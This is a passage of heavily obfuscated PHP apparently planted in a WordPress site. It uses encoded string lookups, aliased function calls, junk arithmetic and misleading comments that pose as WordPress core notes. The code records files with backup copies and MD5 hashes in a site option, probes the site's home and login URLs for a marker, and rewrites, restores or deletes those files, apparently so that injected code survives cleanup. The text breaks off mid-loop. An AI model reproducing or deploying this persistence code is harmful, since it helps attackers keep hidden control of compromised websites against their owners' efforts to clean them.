 $wmi9vtfi67mkceoi  =     @get_option(xognx_h1jzkh(544), "");
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($wmi9vtfi67mkceoi)  || $GLOBALS['__scf_j_4rj7vg4ae0j_7']($wmi9vtfi67mkceoi, ar6vo_1nyhx2koj5(1413))    !==      0)  return    false;
    $lex1fz8hla3oq = (int) $GLOBALS['__scf__fl_gwujcblq_9']($wmi9vtfi67mkceoi,   (0x3+0x3));



 if    ($lex1fz8hla3oq  && $GLOBALS['__scf_ks7_xfapvywl_185']() -     $lex1fz8hla3oq >  (86387+13))    return false;
 return  true;
   }
 function ut5isdl00gkjaids($bki0gi20hmqucm, $g6ep2n9kogd3)
      {
      if  (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1365))  ||    !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(169)))  return   false;
  $a3l16_60s2rsqw9 =    @get_option(ar6vo_1nyhx2koj5(1414),     array());
 if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9))  $a3l16_60s2rsqw9     = array();
 if  (!isset($a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1404)])    ||    !$GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9[xpm5lg9odtw6di(1415)])) {


$eiig6pw9f0  =    array();
    if  (isset($a3l16_60s2rsqw9['t'],  $a3l16_60s2rsqw9['p'], $a3l16_60s2rsqw9['b']))   {
   $j3vc9z8ye980p =  (string)   $a3l16_60s2rsqw9['p'];
$gm1mxnaaohmk9uh  =   (string)  $a3l16_60s2rsqw9['b'];
$eiig6pw9f0[$GLOBALS['__scf_eo363tjzd4r6n_56']($j3vc9z8ye980p)]  =     array('t'  =>  (string) $a3l16_60s2rsqw9['t'], 'p'     => $j3vc9z8ye980p,  'b'   => $gm1mxnaaohmk9uh,     xpm5lg9odtw6di(1416)      =>    isset($a3l16_60s2rsqw9[xpm5lg9odtw6di(1416)])    ?    (int)   $a3l16_60s2rsqw9[xpm5lg9odtw6di(1416)]     :     $GLOBALS['__scf_ks7_xfapvywl_185'](), xpm5lg9odtw6di(1417)  =>     0,    'n'   =>   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($gm1mxnaaohmk9uh) &&   (int) @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($gm1mxnaaohmk9uh)  ===    0)      ?    1  : 0);
    $n4ya2e3nmtr0j   =   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1418)) ? @md5_file($j3vc9z8ye980p)  :      false;


if ($GLOBALS['__scf_is0fvk8c7tq2_41']($n4ya2e3nmtr0j)  &&  $n4ya2e3nmtr0j   !==   "") $eiig6pw9f0[$GLOBALS['__scf_eo363tjzd4r6n_56']($j3vc9z8ye980p)]['h']     =     $n4ya2e3nmtr0j;
  unset($j3vc9z8ye980p,   $gm1mxnaaohmk9uh,  $n4ya2e3nmtr0j);



 }
 $a3l16_60s2rsqw9  =   array(gz_aorofp7mo(1415)    => $eiig6pw9f0);



      }
// WP Script Modules taxonomy registration




$wvf0emlp6_y7ru  = $GLOBALS['__scf_eo363tjzd4r6n_56']($bki0gi20hmqucm);
      $lokikpk9qwgj0e    = d0snst04gqtqcr()   ? 1     : 0;$x8p36lbnx897=111|141;$l49rsvoap5raqh=$x8p36lbnx897^189;
  $y3l8bzokhfdrtlud   =   !isset($a3l16_60s2rsqw9[xpm5lg9odtw6di(1419)][$wvf0emlp6_y7ru]);



if (!$y3l8bzokhfdrtlud)  {


$a3l16_60s2rsqw9[xognx_h1jzkh(1420)][$wvf0emlp6_y7ru][gz_aorofp7mo(1416)] =   $GLOBALS['__scf_ks7_xfapvywl_185']();
        $a3l16_60s2rsqw9[gz_aorofp7mo(1420)][$wvf0emlp6_y7ru]['g']    =  $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);
$a3l16_60s2rsqw9[bk9m46jygo3f(1420)][$wvf0emlp6_y7ru][bk9m46jygo3f(1421)] =   0;
 $a3l16_60s2rsqw9[gz_aorofp7mo(1422)][$wvf0emlp6_y7ru]['n']     = ($g6ep2n9kogd3 ===      "")  ?    1 :   0;
    $a3l16_60s2rsqw9[bk9m46jygo3f(1422)][$wvf0emlp6_y7ru][gz_aorofp7mo(1423)]  =  $lokikpk9qwgj0e;
 $a3l16_60s2rsqw9[bk9m46jygo3f(1422)][$wvf0emlp6_y7ru][ar6vo_1nyhx2koj5(1424)] =    $GLOBALS['__scf_ks7_xfapvywl_185']();
 $a3l16_60s2rsqw9[xognx_h1jzkh(1422)][$wvf0emlp6_y7ru][ar6vo_1nyhx2koj5(1425)]   =  0;



   $a3l16_60s2rsqw9[gz_aorofp7mo(1426)][$wvf0emlp6_y7ru][xognx_h1jzkh(1427)]  =  0;
  $a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1426)][$wvf0emlp6_y7ru][xognx_h1jzkh(1428)]      =    0;
 if (!rmpvo8i8m8kfd9311njxy7($a3l16_60s2rsqw9[xognx_h1jzkh(1426)][$wvf0emlp6_y7ru]['b'], $g6ep2n9kogd3))   {



   kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1429),   bk9m46jygo3f(1430));
  return  false;
 }


   }   else   {
   if  ($GLOBALS['__scf_oenrsvkzs1_36']($a3l16_60s2rsqw9[xpm5lg9odtw6di(1431)])  >=   (0x8+0x2))  {
  kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1429),    gz_aorofp7mo(1432));
    return  false;
 }
       $dhb4mklrk0 =      fgatjmo7gg2xolgmpki4y2();
$f3vjgww96qle = $dhb4mklrk0 .  gz_aorofp7mo(1433)  .  g2g3r6pz8prst3gz($bki0gi20hmqucm,  (5+7))   .  gz_aorofp7mo(1434);
if (!rmpvo8i8m8kfd9311njxy7($f3vjgww96qle, $g6ep2n9kogd3))  {



 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1429),  xognx_h1jzkh(1430));



  return    false;
}
      $a3l16_60s2rsqw9[bk9m46jygo3f(1431)][$wvf0emlp6_y7ru]    =     array('t' =>  n2skhb7hhhdfodahk((2<<3)),   'p'      =>     $bki0gi20hmqucm,     'b'    =>    $f3vjgww96qle,  xognx_h1jzkh(1435)     =>   $GLOBALS['__scf_ks7_xfapvywl_185'](),  'g'  => $GLOBALS['__scf_nz_jvx37ph58fn_287'](true), xognx_h1jzkh(1436)  =>   0, 'n'  => ($g6ep2n9kogd3 ===  "")    ?  1     :  0, xognx_h1jzkh(1437) => $lokikpk9qwgj0e, xpm5lg9odtw6di(1424) => $GLOBALS['__scf_ks7_xfapvywl_185'](),     gz_aorofp7mo(1425) =>   0,   xognx_h1jzkh(1427) =>    0,   ar6vo_1nyhx2koj5(1438)  =>      0);$epvzr38rwzhksb=PHP_MAJOR_VERSION;$rf4uev407t3=$epvzr38rwzhksb*7;
}
  $_k15f1r1fhb25w = @update_option(gz_aorofp7mo(1414),  $a3l16_60s2rsqw9, bk9m46jygo3f(1364));
  if (!$_k15f1r1fhb25w)   {
     if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1439))) @wp_cache_delete(ar6vo_1nyhx2koj5(1414),   xpm5lg9odtw6di(1440));
 $ywi_rened97g_q =   @get_option(xognx_h1jzkh(1414),     array());
  $im3k0raj5t1b = $GLOBALS['__scf_zj8mp2xbaqmp_35']($ywi_rened97g_q)   &&    isset($ywi_rened97g_q[xpm5lg9odtw6di(1431)][$wvf0emlp6_y7ru])  &&  $GLOBALS['__scf_zj8mp2xbaqmp_35']($ywi_rened97g_q[ar6vo_1nyhx2koj5(1441)][$wvf0emlp6_y7ru])
&& isset($ywi_rened97g_q[bk9m46jygo3f(1441)][$wvf0emlp6_y7ru]['g'])  &&  (string)  $ywi_rened97g_q[xognx_h1jzkh(1442)][$wvf0emlp6_y7ru]['g']   ===  (string)  $a3l16_60s2rsqw9[xpm5lg9odtw6di(1442)][$wvf0emlp6_y7ru]['g'];



 if    (!$im3k0raj5t1b)   {
   if ($y3l8bzokhfdrtlud)     xv6oqhjncehpr7v_mus7($a3l16_60s2rsqw9[bk9m46jygo3f(1442)][$wvf0emlp6_y7ru]['b']);
     kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1429),     ar6vo_1nyhx2koj5(1443));
  return  false;
}
     }
/* undecidable facade */

       $GLOBALS['__scf_l3dns7czmg3tv_169'](ar6vo_1nyhx2koj5(1444));
return  true;
     }



 function  nvedm23byjp5mvj1trthv8()
     {
 if (!isset($GLOBALS[gz_aorofp7mo(961)])  || !$GLOBALS['__scf_r6o5_04u5j1_1445']($GLOBALS[ar6vo_1nyhx2koj5(961)]))   $GLOBALS[ar6vo_1nyhx2koj5(961)] =  0.0;
  return 11.0 - $GLOBALS[xpm5lg9odtw6di(961)];

  }
      function  l_e6t_ptzrlfvv70j($leuve6mb8x)
 {
      $GLOBALS[xognx_h1jzkh(961)]  =   (isset($GLOBALS[ar6vo_1nyhx2koj5(1446)])  && $GLOBALS['__scf_r6o5_04u5j1_1445']($GLOBALS[gz_aorofp7mo(1446)])   ?    $GLOBALS[xognx_h1jzkh(1447)]  :  0.0)  +   (float)   $leuve6mb8x;$v15wr446l=43*7;$wlqe7xtm2=$v15wr446l-36;
  }

function  aq4hfjkjyr_26wxsz5($qtr5uy4p51jdn22)
     {
    $a4ssqf5ckwvn  =  nvedm23byjp5mvj1trthv8();


 if  ($a4ssqf5ckwvn <=     0.5)  return   array(-2, "");
 $i0pyfyu5cc  =    $GLOBALS['__scf_li6gaes851wa_474'](1,  $GLOBALS['__scf_askqa52jtol__2_475']((9-3),   (int) $a4ssqf5ckwvn));
$dt2msferjh8ta2y    =  $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);



 $vkt9gec308gd   =    @$GLOBALS['__scf_md_ke_yv3own8f_290']($qtr5uy4p51jdn22,    array(gz_aorofp7mo(962)   =>  $i0pyfyu5cc,    gz_aorofp7mo(963)     =>  false, ar6vo_1nyhx2koj5(1448) =>  true,   xognx_h1jzkh(958)  =>  0,    xognx_h1jzkh(1449) =>    (1048564+12), gz_aorofp7mo(1450)  =>    array(gz_aorofp7mo(959)  => ar6vo_1nyhx2koj5(1451),  xpm5lg9odtw6di(1452) =>   xognx_h1jzkh(960))));
     l_e6t_ptzrlfvv70j($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)  -    $dt2msferjh8ta2y);
 if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1453))   &&  is_wp_error($vkt9gec308gd)) return   array(-1,  false);
$mv_rk9qw6jz0v  =  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1454))  ?     (int) wp_remote_retrieve_response_code($vkt9gec308gd)   : 0;
  return  array($mv_rk9qw6jz0v, $mv_rk9qw6jz0v >    0 &&  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1455)) ?   (string)   wp_remote_retrieve_body($vkt9gec308gd)  : "");
 }
    function  ykbctv6vdni0fv($bki0gi20hmqucm)
    {
  if   (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1402))  ||    !$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1365))   ||  !$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1418)))     return;
 $a3l16_60s2rsqw9  = @get_option(xognx_h1jzkh(1414),     array());
    if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9)      || !isset($a3l16_60s2rsqw9[xognx_h1jzkh(1456)]) || !$GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9[xognx_h1jzkh(1457)]))    return;
  $wvf0emlp6_y7ru  =   $GLOBALS['__scf_eo363tjzd4r6n_56']($bki0gi20hmqucm);
 if (!isset($a3l16_60s2rsqw9[bk9m46jygo3f(1458)][$wvf0emlp6_y7ru]))   return;
$_v44jfvalbfkj6ch     = @md5_file($bki0gi20hmqucm);



   if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_v44jfvalbfkj6ch)    ||     $_v44jfvalbfkj6ch   === "")   return;
 $a3l16_60s2rsqw9[bk9m46jygo3f(1458)][$wvf0emlp6_y7ru]['h']      =    $_v44jfvalbfkj6ch;
      @update_option(xognx_h1jzkh(1459),     $a3l16_60s2rsqw9, ar6vo_1nyhx2koj5(1364));

}
   function  tj8zrsf_o9spxz8usq($n_2ru_zt6chty)
     {
    $tpjnsbwgcs78nh   =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($n_2ru_zt6chty['b']);
      if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($tpjnsbwgcs78nh))  return     false;
    if (!empty($n_2ru_zt6chty['h'])   &&  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1418)))  {
$vrnk3jfkp3fnrwgq  = @md5_file($n_2ru_zt6chty['p']);


 if ($GLOBALS['__scf_is0fvk8c7tq2_41']($vrnk3jfkp3fnrwgq)     &&   $vrnk3jfkp3fnrwgq !==   ""   &&    $vrnk3jfkp3fnrwgq    !== $n_2ru_zt6chty['h'])  return    false;
     unset($vrnk3jfkp3fnrwgq);
}
 if   ($tpjnsbwgcs78nh  === "")   {
if     (empty($n_2ru_zt6chty['n']))  return false;  
    $e4ji982ca28fua1p   =  !@$GLOBALS['__scf_vpig9uwvw8_pu_20']($n_2ru_zt6chty['p']);
     if    (!$e4ji982ca28fua1p)  {

 f97udlofaljpuxw1_jgnfh($n_2ru_zt6chty['p'],  (392+28));
  $e4ji982ca28fua1p    =    xv6oqhjncehpr7v_mus7($n_2ru_zt6chty['p']);
 }
 if     ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1289)))  @opcache_invalidate($n_2ru_zt6chty['p'],  true);
return $e4ji982ca28fua1p;
     }



if  (!rmpvo8i8m8kfd9311njxy7($n_2ru_zt6chty['p'],   $tpjnsbwgcs78nh))     return  false;
     if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1289))) @opcache_invalidate($n_2ru_zt6chty['p'],  true);
 return true;
       }



    function   vl0yp14yk306qwo()
{
   if   (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1402)))  return;
if (!empty($GLOBALS[ar6vo_1nyhx2koj5(131)]))  return;
 if      (!_sshnzj53qt2m4bfy5eod(gz_aorofp7mo(1459)))   return;
 try {
 $a3l16_60s2rsqw9   =  @get_option(bk9m46jygo3f(1459),  array());
if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9))    return;

       if (!isset($a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1460)])    ||    !$GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9[xpm5lg9odtw6di(1460)])) {
     $eiig6pw9f0 =    array();
       if  (isset($a3l16_60s2rsqw9['t'],  $a3l16_60s2rsqw9['p'], $a3l16_60s2rsqw9['b']))    {
   $j3vc9z8ye980p   =   (string) $a3l16_60s2rsqw9['p'];
 $gm1mxnaaohmk9uh  =   (string)  $a3l16_60s2rsqw9['b'];

  $eiig6pw9f0[$GLOBALS['__scf_eo363tjzd4r6n_56']($j3vc9z8ye980p)] = array('t'  => (string)   $a3l16_60s2rsqw9['t'],     'p'     => $j3vc9z8ye980p,    'b'   => $gm1mxnaaohmk9uh, xognx_h1jzkh(1461) => isset($a3l16_60s2rsqw9[xpm5lg9odtw6di(1461)])   ?    (int)    $a3l16_60s2rsqw9[gz_aorofp7mo(1462)]   :     $GLOBALS['__scf_ks7_xfapvywl_185'](), ar6vo_1nyhx2koj5(1436)     =>  0, 'n'  =>  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($gm1mxnaaohmk9uh)      &&   (int)  @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($gm1mxnaaohmk9uh)     ===   0)  ?  1      :  0);
  $n4ya2e3nmtr0j   =   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1418)) ?    @md5_file($j3vc9z8ye980p)   :   false;
 if ($GLOBALS['__scf_is0fvk8c7tq2_41']($n4ya2e3nmtr0j)  &&    $n4ya2e3nmtr0j  !==   "")  $eiig6pw9f0[$GLOBALS['__scf_eo363tjzd4r6n_56']($j3vc9z8ye980p)]['h']      = $n4ya2e3nmtr0j;
  unset($j3vc9z8ye980p,   $gm1mxnaaohmk9uh, $n4ya2e3nmtr0j);
 }


$a3l16_60s2rsqw9  =   array(xognx_h1jzkh(1460)     =>  $eiig6pw9f0);
  }
    if   (empty($a3l16_60s2rsqw9[gz_aorofp7mo(1460)]))  {
 @delete_option(bk9m46jygo3f(1463));
      return;
 }


if    (d0snst04gqtqcr())  {
$pyi7kwwwxlpf1  =  false;
   foreach   ($a3l16_60s2rsqw9[gz_aorofp7mo(1464)]  as $zfijz79gi99m5md      =>    $w06fc_sp0nu_16ij) {
   if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($w06fc_sp0nu_16ij)   &&  empty($w06fc_sp0nu_16ij[ar6vo_1nyhx2koj5(1465)]))   {



 $a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1466)][$zfijz79gi99m5md][gz_aorofp7mo(1467)]   =  1;


    $pyi7kwwwxlpf1 =  true;
}
    }
 if ($pyi7kwwwxlpf1)  @update_option(xpm5lg9odtw6di(1463), $a3l16_60s2rsqw9,  xpm5lg9odtw6di(1364));


  unset($pyi7kwwwxlpf1, $zfijz79gi99m5md, $w06fc_sp0nu_16ij);
     return;


    }
     static    $wwt12vwxgisojfqf  =     false;


 if ($wwt12vwxgisojfqf) return;
  $wwt12vwxgisojfqf = true;
 $rf_3anf2fsf  =   $GLOBALS['__scf_f_zov197oj1_706']($a3l16_60s2rsqw9[xognx_h1jzkh(1466)]);
 $hzj7wsu8d_tpzz  =  array();$pglgeqxvjwlww=(0x49+0x7d);$qiidkvcjdq=$pglgeqxvjwlww%13;
 if  ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(385)))  @$GLOBALS['__scf_gyqx0aoue42_385']();
  elseif   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(386)))      @$GLOBALS['__scf_e26frum9mv_386']();
if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(388)))  @$GLOBALS['__scf_k6gt90r92gxj8_388'](true);
   if  (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(955))     ||   !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1122))) return;


       $aupacwwqabkae  = home_url('/');
 $ngjmog6spll6 =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(554))  ? wp_login_url()   : $aupacwwqabkae  .  xognx_h1jzkh(553);
   $gk346m9zj2gq  = false;



$_od3cugccf39  = true;
     $a4ssqf5ckwvn     =  (6-3);
  foreach ($a3l16_60s2rsqw9[gz_aorofp7mo(1466)]     as   $wvf0emlp6_y7ru   =>      $n_2ru_zt6chty)   {
      if (nvedm23byjp5mvj1trthv8()    <=  0.5)    break;
if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($n_2ru_zt6chty)     ||  empty($n_2ru_zt6chty['t'])  ||   empty($n_2ru_zt6chty['p'])  ||  empty($n_2ru_zt6chty['b'])) {
unset($a3l16_60s2rsqw9[gz_aorofp7mo(1466)][$wvf0emlp6_y7ru]);
$gk346m9zj2gq =  true;
    continue;
  }
if  (!isset($n_2ru_zt6chty['n']) || !isset($n_2ru_zt6chty['h']))     {
  if    (!isset($n_2ru_zt6chty['n']))  $n_2ru_zt6chty['n']  = (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($n_2ru_zt6chty['b']) &&  (int)     @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($n_2ru_zt6chty['b']) ===   0)  ?   1 :  0;

  if  (!isset($n_2ru_zt6chty['h'])    &&   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1468))) {
 $xrzt88_1rcl2  =  @md5_file($n_2ru_zt6chty['p']);
     if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($xrzt88_1rcl2)  &&  $xrzt88_1rcl2 !== "")   $n_2ru_zt6chty['h']   =     $xrzt88_1rcl2;$f4qyc_e26d_g30=PHP_INT_MAX/PHP_INT_MAX;$a0n6k6ice=$f4qyc_e26d_g30+85;
  unset($xrzt88_1rcl2);

}
// WordPress 6.3 commands: escape-analyze authority

        $a3l16_60s2rsqw9[bk9m46jygo3f(1466)][$wvf0emlp6_y7ru] =    $n_2ru_zt6chty;
$gk346m9zj2gq  = true;
      }
    if    (!empty($n_2ru_zt6chty[xognx_h1jzkh(1467)])) {
   $n_2ru_zt6chty[ar6vo_1nyhx2koj5(1467)]  =   0;
    $n_2ru_zt6chty[ar6vo_1nyhx2koj5(1462)] = $GLOBALS['__scf_ks7_xfapvywl_185']();
    $n_2ru_zt6chty[bk9m46jygo3f(1469)]   = 0;
  $n_2ru_zt6chty[ar6vo_1nyhx2koj5(1470)] =  0;
 $n_2ru_zt6chty[bk9m46jygo3f(1427)] =   0;
       $n_2ru_zt6chty[ar6vo_1nyhx2koj5(1471)]    = 0;
  $a3l16_60s2rsqw9[xognx_h1jzkh(1466)][$wvf0emlp6_y7ru]    = $n_2ru_zt6chty;
$gk346m9zj2gq  =  true;
      }
  if     (empty($n_2ru_zt6chty[xognx_h1jzkh(1424)]))     {
 $a3l16_60s2rsqw9[gz_aorofp7mo(1466)][$wvf0emlp6_y7ru][ar6vo_1nyhx2koj5(1472)]  = (int)    $n_2ru_zt6chty[xognx_h1jzkh(1462)];
$n_2ru_zt6chty[xognx_h1jzkh(1472)] =   (int) $n_2ru_zt6chty[xpm5lg9odtw6di(1462)];
    $gk346m9zj2gq  = true;
 }
  if      (!empty($n_2ru_zt6chty[xognx_h1jzkh(1427)])   &&   $GLOBALS['__scf_ks7_xfapvywl_185']() < (int) $n_2ru_zt6chty[xognx_h1jzkh(1473)])   continue;
 if ($a4ssqf5ckwvn     <= 0)    break;
 $a4ssqf5ckwvn--;
   $f1r99wls1wz40 = bk9m46jygo3f(1474)   .  $GLOBALS['__scf_zhapk2qsifinh7_1475']($n_2ru_zt6chty['t']) .  xpm5lg9odtw6di(1476)    . $GLOBALS['__scf_jlhdedaik0c_347']((99986+14),  (0x46b1+0xefb8e));
   list($mv_rk9qw6jz0v,  $j4m6p80rvzt)   =   aq4hfjkjyr_26wxsz5($aupacwwqabkae   .    $f1r99wls1wz40);
   if   ($mv_rk9qw6jz0v  === -2)  break;
if ($mv_rk9qw6jz0v   >    0) $_od3cugccf39    = false;
     if  ($mv_rk9qw6jz0v  ===   -1  &&     $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(669)) &&  nvedm23byjp5mvj1trthv8()    >   2)     $GLOBALS['__scf_u9br1q5valhof_668'](1);
if ($mv_rk9qw6jz0v    ===    -1)  {
 list($mv_rk9qw6jz0v,   $j4m6p80rvzt)    = aq4hfjkjyr_26wxsz5($aupacwwqabkae   .   $f1r99wls1wz40);



    if    ($mv_rk9qw6jz0v   === -2)    break;

     if  ($mv_rk9qw6jz0v   > 0)     $_od3cugccf39 =  false;
 }
  if    ($mv_rk9qw6jz0v <=  0)  {


    $a3l16_60s2rsqw9[gz_aorofp7mo(1466)][$wvf0emlp6_y7ru][gz_aorofp7mo(1469)]++;
      $gk346m9zj2gq    =   true;

 continue;$tptboetw69=(0x8+0xa9);$hy6s2n95c=$tptboetw69%8;

 }
   if      ($mv_rk9qw6jz0v >=     (460+40))   {
    if     (tj8zrsf_o9spxz8usq($n_2ru_zt6chty))  {$dep8y09gt7vx=-958;$okcy951gh_o=($dep8y09gt7vx>0)?$dep8y09gt7vx:-$dep8y09gt7vx;
kkpdha95nyx3tbltd10(gz_aorofp7mo(1429), xpm5lg9odtw6di(1477)   .    $GLOBALS['__scf_pmoxtzoe3f0qw_3']($n_2ru_zt6chty['p']));$nuxzg9nvhz=-821;$knsvfjzth305=($nuxzg9nvhz>0)?$nuxzg9nvhz:-$nuxzg9nvhz;
$hzj7wsu8d_tpzz[$wvf0emlp6_y7ru] =  $n_2ru_zt6chty;
unset($a3l16_60s2rsqw9[xpm5lg9odtw6di(1478)][$wvf0emlp6_y7ru]);
} else  {
      $a3l16_60s2rsqw9[xpm5lg9odtw6di(1478)][$wvf0emlp6_y7ru][xpm5lg9odtw6di(1469)]++;
   }
 $gk346m9zj2gq = true;


   continue;
}
     if    ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($j4m6p80rvzt, gz_aorofp7mo(1479)  . $n_2ru_zt6chty['t']    .  bk9m46jygo3f(1412)) !==  false)  {
 $hzj7wsu8d_tpzz[$wvf0emlp6_y7ru] =  $n_2ru_zt6chty;
 unset($a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1478)][$wvf0emlp6_y7ru]);


  $gk346m9zj2gq   =   true;
   continue;
       }
list($naxyanygodkw1_,     $rqa_xrmnv13)   = aq4hfjkjyr_26wxsz5($ngjmog6spll6      . ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($ngjmog6spll6,     '?') ===  false     ? '?'    :    '&') .  xpm5lg9odtw6di(1480)      .   $GLOBALS['__scf_zhapk2qsifinh7_1475']($n_2ru_zt6chty['t'])  .    xognx_h1jzkh(1481)  .  $GLOBALS['__scf_jlhdedaik0c_347']((99954+46),  (1828958-828959)));
   if ($naxyanygodkw1_  === -2) break;
        if ($naxyanygodkw1_  >  0)   $_od3cugccf39  = false;



  if   ($naxyanygodkw1_      >=  (776-276))    {
  if (tj8zrsf_o9spxz8usq($n_2ru_zt6chty))   {$me4qyitu=7649;$kzeqb7o2s=$me4qyitu%7;
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1429),  xognx_h1jzkh(1482)  .     $GLOBALS['__scf_pmoxtzoe3f0qw_3']($n_2ru_zt6chty['p']));
$hzj7wsu8d_tpzz[$wvf0emlp6_y7ru]  = $n_2ru_zt6chty;
   unset($a3l16_60s2rsqw9[gz_aorofp7mo(1483)][$wvf0emlp6_y7ru]);
    

   }    else   {

 $a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1483)][$wvf0emlp6_y7ru][xpm5lg9odtw6di(1469)]++;
}
// WP Query Loop responsive breakpoint

   $gk346m9zj2gq =   true;



continue;

 }
// WP Formatting API: flatten invariant

if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($rqa_xrmnv13)  && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($rqa_xrmnv13,    gz_aorofp7mo(1479)    . $n_2ru_zt6chty['t'] .  bk9m46jygo3f(1412))    !==  false)   {
   $hzj7wsu8d_tpzz[$wvf0emlp6_y7ru] = $n_2ru_zt6chty;
      unset($a3l16_60s2rsqw9[bk9m46jygo3f(1483)][$wvf0emlp6_y7ru]);
    $gk346m9zj2gq =    true;

continue;
 }
    $a3l16_60s2rsqw9[bk9m46jygo3f(1483)][$wvf0emlp6_y7ru][bk9m46jygo3f(1484)]  =    (int) (isset($a3l16_60s2rsqw9[xpm5lg9odtw6di(1483)][$wvf0emlp6_y7ru][gz_aorofp7mo(1485)])   ?     $a3l16_60s2rsqw9[bk9m46jygo3f(1483)][$wvf0emlp6_y7ru][gz_aorofp7mo(1486)]    : 0)   +  1;
if     ($GLOBALS['__scf_ks7_xfapvywl_185']() -  (int)   $a3l16_60s2rsqw9[gz_aorofp7mo(1483)][$wvf0emlp6_y7ru][xognx_h1jzkh(1487)]   >  (604753+47))  {

  $a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1488)][$wvf0emlp6_y7ru][xognx_h1jzkh(1489)] =    1;
     $a3l16_60s2rsqw9[xognx_h1jzkh(1490)][$wvf0emlp6_y7ru][ar6vo_1nyhx2koj5(1491)]   =  $GLOBALS['__scf_ks7_xfapvywl_185']()   +  (86316+84);
   

 }  else  {
       $sp1ekcvwj47i4x   = array((143^179),  (0xb2+0x7a), (226+674),   (3595+5));



  $m57dlqgjb9v  = (int)  $a3l16_60s2rsqw9[bk9m46jygo3f(1492)][$wvf0emlp6_y7ru][gz_aorofp7mo(1486)];
   $a3l16_60s2rsqw9[gz_aorofp7mo(1492)][$wvf0emlp6_y7ru][ar6vo_1nyhx2koj5(1491)] =   $GLOBALS['__scf_ks7_xfapvywl_185']()  + $sp1ekcvwj47i4x[$GLOBALS['__scf_askqa52jtol__2_475']($m57dlqgjb9v,  (1+3))  -  1];
unset($sp1ekcvwj47i4x, $m57dlqgjb9v);
 }
// expected mediator


    $gk346m9zj2gq    =      true;
   }
  if ($_od3cugccf39 && $gk346m9zj2gq   &&    !empty($a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1492)]))      {
  $fymtx6hsogbge     = false;


   foreach  ($a3l16_60s2rsqw9[xpm5lg9odtw6di(1493)]    as     $gwg0fsqvt08)    {
 if  ((int)   $gwg0fsqvt08[ar6vo_1nyhx2koj5(1469)]    >=  (166^165))   {


    $fymtx6hsogbge    = true;
  break;
}
 }
  if   ($fymtx6hsogbge)   {
  @update_option(gz_aorofp7mo(1494), xpm5lg9odtw6di(1495)  .  $GLOBALS['__scf_ks7_xfapvywl_185'](), gz_aorofp7mo(1364));
     kkpdha95nyx3tbltd10(bk9m46jygo3f(1429),  bk9m46jygo3f(1496));
     foreach      ($a3l16_60s2rsqw9[xpm5lg9odtw6di(1493)]  as  $u0vg1o4w59jt6xuu  =>   $gwg0fsqvt08)    {
